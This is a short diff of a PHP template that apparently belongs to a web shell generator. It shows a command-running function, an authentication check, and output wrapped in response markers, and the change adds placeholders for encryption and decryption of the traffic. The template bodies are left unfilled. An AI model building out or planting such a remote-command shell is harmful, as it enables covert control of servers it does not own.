@@ -1,9 +1,11 @@
 <?php
+{{crypto_helpers}}
 function __ss_run($__ss_cmd) {
     {{driver_body}}
 }
 {{cmd_read}}
 {{auth_block}}
+{{decrypt_block}}
 if ($__ss_ok && $__ss_cmd !== "") {
-    echo "{{response_begin}}" . __ss_run($__ss_cmd) . "{{response_end}}";
+    echo "{{response_begin}}" . {{output_expr}} . "{{response_end}}";
 }
